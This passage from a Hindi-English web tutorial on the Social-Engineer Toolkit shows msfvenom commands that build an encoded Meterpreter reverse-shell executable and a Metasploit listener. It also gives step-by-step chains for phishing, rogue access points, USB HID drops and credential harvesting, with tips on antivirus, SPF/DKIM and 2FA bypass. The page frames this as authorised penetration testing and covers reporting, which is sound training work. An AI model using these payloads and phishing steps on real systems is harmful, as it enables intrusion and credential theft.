# 4) Create a Payload and Listener
# 1) Windows Reverse TCP (Meterpreter)

# set.config में encoding settings:
# ENCODE_PAYLOAD=true
# ENCODE_ITERATIONS=5
# ENCODE_TYPE=shikata_ga_nai

# Manual encoding (Metasploit से):
msfvenom -p windows/meterpreter/reverse_tcp
  LHOST=192.168.1.10 LPORT=4444
  -e x86/shikata_ga_nai -i 5
  -f exe -o payload_encoded.exe

# HTA payload (bypass modern AV):
# SET में 1→2→7 select करो
# HTA file JavaScript + VBScript mix use करता है
# Browser automatically execute करता है`}
      />
      <CodeBlock
        title="WiFi and Hardware Attack Combinations"
        code={`# WiFi AP + Credential Harvesting combo:
# Step 1: Rogue AP बनाओ (SET में 1→7)
# Step 2: DNS spoofing enable करो
# Step 3: Credential harvester start करो (1→2→3)
# जब victim connect करेगा → fake page दिखेगा

# Arduino HID + Payload delivery:
# Step 1: Arduino payload generate करो (1→6)
# Step 2: Arduino board पर upload करो
# Step 3: Victim के computer में plug करो
# Keyboard injection automatically payload execute करेगा

# QR Code + Phishing combo:
# Step 1: Credential harvester start करो (1→2→3)
# Step 2: QR code generate करो (1→8)
# Step 3: QR code को posters/emails में embed करो
# Mobile users scan करेंगे → fake page पर redirect`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        सोशल इंजीनियरिंग attacks real-world में बहुत common हैं। यहाँ कुछ उदाहरण हैं जो दिखाते हैं कि कैसे SET जैसे tools का इस्तेमाल security testing में होता है:
      </p>
      <p>
        <strong className="text-white">Case Study 1 — Corporate Phishing Assessment:</strong> एक बड़ी IT कंपनी ने TrustedSec को hire किया अपने 5000 employees की security awareness test करने के लिए। SET का credential harvesting module use करके fake Office 365 login page बनाया गया। 30% employees ने अपने credentials enter कर दिए। इस report के बाद company ने mandatory security training implement की और MFA enable किया। दोबारा test में सिर्फ 8% employees ने credentials दिए।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — Red Team USB Drop Attack:</strong> एक bank की security audit में red team ने parking lot में 50 USB drives छोड़े जिनमें SET-generated payloads थे। 15 USB drives employees ने उठाकर अपने computers में plug किए। Payload ने reverse shell establish किया और internal network access मिल गया। इस test के बाद bank ने USB ports disable किए और security awareness program शुरू किया।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — CEO Fraud Simulation:</strong> एक manufacturing company में CFO को spear-phishing email भेजी गई जो CEO की email ID से spoofed थी। Email में urgent wire transfer की request थी। SET के mass mailer और custom templates use किए गए। CFO ने email पर click कर दिया और fake portal पर credentials enter कर दिए। इस incident के बाद company ने email authentication (DMARC) implement किया और wire transfer verification process बनाया।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        SET अकेले powerful है, लेकिन दूसरे tools के साथ combine करने पर और भी effective हो जाता है:
      </p>
      <CodeBlock
        title="SET + Metasploit + GoPhish Combo"
        code={`# Step 1: GoPhish से campaign setup करो (tracking के लिए):
# GoPhish web interface: https://localhost:3333
# Campaign बनाओ — email template, landing page, target group

# Step 2: SET से payload generate करो:
sudo setoolkit
# 1→4→1 (Windows Reverse TCP Meterpreter)
# LHOST: 192.168.1.10, LPORT: 4444
# Payload: /root/.set/payload.exe

# Step 3: GoPhish email में payload attach करो:
# GoPhish → Email Template → Attach payload.exe

# Step 4: Metasploit listener start करो:
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit -j

# Step 5: Campaign launch करो (GoPhish से)
# GoPhish tracking दिखाएगा: opens, clicks, submissions
# SET payloads connect back करेंगे Metasploit को`}
      />
      <CodeBlock
        title="SET + Social Media OSINT"
        code={`# OSINT + Phishing combo:
# Step 1: theHarvester से email addresses collect करो:
theharvester -d company.com -b google,linkedin

# Step 2: Maltego से employee profiles बनाओ:
# Job titles, interests, social media profiles

# Step 3: SET से targeted spear-phishing:
sudo setoolkit
# 1→1 (Spear-Phishing)
# Custom template बनाओ — employee के interest based
# उदाहरण: "New HR Policy Update" for HR department

# Step 4: SocialFish से social media phishing:
# Facebook/Instagram fake pages
# SET credential harvester + SocialFish combine करो

# Step 5: Results analyze करो:
# Kaunti technique सबसे effective रही?
# Kaunse department में सबसे ज़्यादा clicks आए?`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        SET operations के बाद proper reporting बहुत ज़रूरी है — client को detailed report देनी होती है:
      </p>
      <CodeBlock
        title="SET Output Logs and Analysis"
        code={`# SET logs location:
cat /root/.set/logs/set.log

# Captured credentials:
cat /root/.set/logs/harvester_*.log

# Email delivery reports:
cat /root/.set/logs/mail_*.log

# Payload generation logs:
ls /root/.set/payloads/

# Report generation script:
#!/bin/bash
echo "=== SET Phishing Assessment Report ==="
echo "Date: $(date)"
echo ""
echo "--- Captured Credentials ---"
cat /root/.set/logs/harvester_*.log 2>/dev/null
echo ""
echo "--- Emails Sent ---"
grep "Email sent" /root/.set/logs/set.log
echo ""
echo "--- Payloads Generated ---"
ls -la /root/.set/payloads/ 2>/dev/null
echo ""
echo "--- Connections Received ---"
grep "Meterpreter" /root/.set/logs/set.log`}
      />
      <CodeBlock
        title="Post-Engagement Documentation"
        code={`# Professional report structure:

# 1. Executive Summary:
# - Kitne targets test kiye
# - Kitne compromised hue
# - Overall risk rating

# 2. Methodology:
# - Kaunse attack vectors use kiye
# - Timeline of attacks
# - Tools used (SET, GoPhish, Metasploit)

# 3. Findings:
# - Credential capture rate (X%)
# - Payload execution rate (Y%)
# - Most effective attack vector
# - Department-wise breakdown

# 4. Screenshots:
# - Fake login pages
# - Captured credentials (redacted)
# - Meterpreter sessions

# 5. Recommendations:
# - Security awareness training
# - MFA implementation
# - Email security (SPF/DKIM/DMARC)
# - Endpoint protection upgrades
# - USB port restrictions`}
      />

      <h2>Performance Tuning</h2>
      <p>
        SET operations को optimize करने के लिए कुछ tips:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SMTP Optimization:</strong> Bulk emails के लिए dedicated SMTP server use करो — Gmail rate limits लगाता है। Postfix ya SendGrid configure करो</li>
        <li><strong className="text-white">Payload Encoding:</strong> Multiple encoding rounds से AV bypass better होता है — 3-5 iterations optimal हैं</li>
        <li><strong className="text-white">Network Bandwidth:</strong> Credential harvester के लिए sufficient bandwidth चाहिए — multiple victims simultaneously connect होंगे</li>
        <li><strong className="text-white">Listener Management:</strong> Multiple payloads के लिए separate listeners use करो — different ports पर</li>
        <li><strong className="text-white">Template Caching:</strong> Website clone करने में time लगता है — pre-cloned templates ready रखो</li>
        <li><strong className="text-white">Database Logging:</strong> SQLite database में results store करो — analysis आसान होती है</li>
        <li><strong className="text-white">Parallel Campaigns:</strong> Multiple departments के लिए parallel campaigns चलाओ — GoPhish से manage करो</li>
        <li><strong className="text-white">Resource Monitoring:</strong> Server resources monitor करो — CPU/RAM usage check करते रहो</li>
      </ul>

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या SET free है?', a: 'हाँ, पूरी तरह free और open source। TrustedSec ने बनाया है और GitHub पर available है। Commercial use भी free।' },
          { q: 'क्या real phishing के लिए use कर सकते हैं?', a: 'नहीं! केवल authorized testing के लिए। बिना permission phishing illegal है — भारत में जेल हो सकती है।' },
          { q: 'GoPhish से better है?', a: 'अलग use cases। GoPhish phishing campaigns track करने में better है — GUI, analytics, reporting। SET payload generation और Metasploit integration में better है। Red team operations के लिए SET best है।' },
          { q: 'Windows पर चलता है?', a: 'नहीं, सिर्फ Linux पर चलता है। Kali Linux recommended है। Parrot OS और BackBox पर भी चलता है।' },
          { q: 'Custom templates use कर सकते हैं?', a: 'हाँ, custom HTML templates import कर सकते हो। /etc/setoolkit/ directory में add करो। Website Attack → Custom Import option use करो।' },
          { q: 'Gmail से phishing emails भेज सकते हैं?', a: 'हाँ, लेकिन Gmail app password use करना होगा। Normal password काम नहीं करता। 2FA enable करके app password generate करो।' },
          { q: 'Antivirus bypass कैसे करें?', a: 'PowerShell attacks use करो — memory-based होते हैं। Custom encoding apply करो। HTA attacks भी effective हैं। Meterpreter HTTPS payloads use करो।' },
          { q: 'कितने targets को एक साथ phishing भेज सकते हैं?', a: 'Mass Mailer mode में unlimited। Email list file provide करो — SET सभी को automatically भेज देगा। SMTP rate limits का ध्यान रखो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">GoPhish</td><td className="py-2 px-3">Phishing campaigns</td><td className="py-2 px-3">Web GUI, tracking, reporting, analytics</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">King Phisher</td><td className="py-2 px-3">Phishing toolkit</td><td className="py-2 px-3">Campaign management, email templates</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">SocialFish</td><td className="py-2 px-3">Social media phishing</td><td className="py-2 px-3">Simple, PHP-based, ngrok integration</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Evilginx2</td><td className="py-2 px-3">Phishing with 2FA bypass</td><td className="py-2 px-3">Adversary-in-the-Middle, session hijacking</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Zphisher</td><td className="py-2 px-3">Automated phishing</td><td className="py-2 px-3">30+ templates, tunneling support</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">BlackEye</td><td className="py-2 px-3">Phishing pages</td><td className="py-2 px-3">30+ website templates, easy to use</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">HiddenEye</td><td className="py-2 px-3">Modern phishing</td><td className="py-2 px-3">Keylogger, location tracker, 40+ pages</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">ShellPhish</td><td className="py-2 px-3">Phishing tool</td><td className="py-2 px-3">Simple, Termux compatible</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>SET का credential harvesting सबसे fast attack है — 2 minute में fake login page ready</li>
          <li>Real red team में GoPhish या Evilginx2 use करो — tracking और reporting बेहतर है</li>
          <li>Payload generation के लिए SET best है — Metasploit integration seamless है</li>
          <li>PowerShell attacks सबसे stealthy हैं — memory-based, disk पर file नहीं बनती</li>
          <li>Custom email templates बनाओ — generic templates spam filter में फंसते हैं</li>
          <li>Gmail app password use करो — 2FA enable करके generate करो</li>
          <li>Mass Mailer से पहले single email से test करो — SMTP settings verify करो</li>
          <li>Lab में practice करो — real targets पर कभी use मत करो</li>
          <li>Website cloning से पहले target site का structure analyze करो — JavaScript-heavy sites properly clone नहीं होते</li>
          <li>Spear-phishing में OSINT बहुत ज़रूरी है — target के बारे में जितना ज़्यादा पता हो, उतना effective attack होगा</li>
          <li>Evilginx2 + SET combo 2FA bypass के लिए best है — adversary-in-the-middle attack</li>
          <li>Payload delivery के लिए HTA files सबसे reliable हैं — modern browsers support करते हैं</li>
          <li>Email headers spoof करने के लिए custom SMTP server use करो — SPF/DKIM bypass techniques सीखो</li>
          <li>Mass mailer में rate limiting set करो — SMTP server block न हो</li>
          <li>Post-engagement report में हमेशा remediation steps include करो — सिर्फ vulnerabilities मत दिखाओ</li>
          <li>Regular phishing simulations चलाओ — quarterly tests से employees की awareness बढ़ती है</li>
        </ul>
      </div>

      <h2>Common Mistakes</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'बिना अनुमति के phishing campaign चलाना', a: 'हमेशा लिखित अनुमति लो। बिना परमिशन के phishing अवैध है — IT Act 2000 के तहत सज़ा हो सकती है।' },
          { q: 'गलत payload select करना', a: 'टार्गेट OS के हिसाब से payload चुनो। Windows के लिए exe/hta, Linux के लिए python/elf।' },
          { q: 'Email headers spoof नहीं करना', a: 'Custom SMTP server यूज़ करो। SPF/DKIM bypass techniques सीखो। बिना spoofing के email spam में जाएगा।' },
          { q: 'Website clone properly नहीं हो रहा', a: 'SSL certificate install करो। Custom HTML template बनाओ। Clone करने से पहले website thoroughly test करो।' },
          { q: 'Post-exploitation steps भूल जाना', a: 'Access मिलने के बाद evidence collect करो। Report में remediation steps include करो।' },
          { q: 'Campaign results track नहीं करना', a: 'Click rates, credential submissions, report rates track करो। Dashboard बनाओ। Quarterly reports generate करो।' },
          { q: 'Payload delivery fail हो रहा', a: 'Firewall/antivirus bypass techniques सीखो। HTA, macro, LNK files try करो। Custom encoders यूज़ करो।' },
          { q: 'SET update नहीं करना', a: 'Regularly SET update करो — `setoolkit` command से update option select करो। नए bypass techniques मिलते हैं।' },
          { q: 'Campaign results analyze नहीं करना', a: 'Click rates, credential submissions, report rates analyze करो। Quarterly reports generate करो। Trends track करो।' },
          { q: 'Remediation steps missing', a: 'Report में हमेशा remediation steps include करो — सिर्फ vulnerabilities मत दिखाओ। Training recommend करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">❌ {item.q}</h4>
            <p className="text-gray-400 text-sm">✅ {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Reporting and Documentation</h2>
      <p>
        Social engineering assessments की reporting बहुत ज़रूरी है।
      </p>
      <CodeBlock
        title="रिपोर्टिंग"
        code={`# SET results कैसे document करें:

# 1. Campaign Summary:
# - Target audience size
# - Emails sent/delivered
# - Click rate
# - Credential submission rate
# - Report rate (who reported phishing)

# 2. Individual Results:
# - Who clicked
# - Who submitted credentials
# - Who reported
# - Time to click/report

# 3. Technical Details:
# - Payload used
# - Delivery method
# - Evasion techniques used
# - Detection rate

# 4. Remediation Steps:
# - Security awareness training
# - Email filtering improvements
# - MFA implementation
# - Incident response procedures

# Executive Summary Template:
echo "=== Social Engineering Assessment Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Target: Company Name" >> report.txt
echo "Scope: 100 employees" >> report.txt
echo "Method: Spear phishing + credential harvesting" >> report.txt
echo "Results:" >> report.txt
echo "  - Emails sent: 100" >> report.txt
echo "  - Clicks: 45 (45%)" >> report.txt
echo "  - Credentials submitted: 20 (20%)" >> report.txt
echo "  - Reported: 15 (15%)" >> report.txt
echo "Recommendations:" >> report.txt
echo "  1. Security awareness training" >> report.txt
echo "  2. MFA implementation" >> report.txt
echo "  3. Email filtering improvements" >> report.txt`}
      />

      <div className="info-box mt-6">
        <strong>💡 अगला कदम:</strong> SET से social engineering सीखने के बाद{' '}
        <Link to="/tool/metasploit-framework" className="text-neon-green underline">Metasploit</Link> सेक्शन में जाएं
        और post-exploitation techniques सीखें! SET से मिली access का इस्तेमाल आगे के attacks में करो। एथिकल हैकिंग के नियमों का हमेशा पालन करो।
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Social-Engineer Toolkit एक powerful attack framework है। इसका इस्तेमाल केवल अधिकृत penetration testing और red team operations में ही करें। बिना अनुमति के phishing, credential harvesting, या malware distribution अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत social engineering attacks अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने लैब वातावरण या लिखित अनुमति के साथ ही उपयोग करें। सभी रिजल्ट्स को एन्क्रिप्टेड रखो और अधिकृत लोगों के साथ ही शेयर करो।
      </div>
    </TutorialLayout>
  )
}
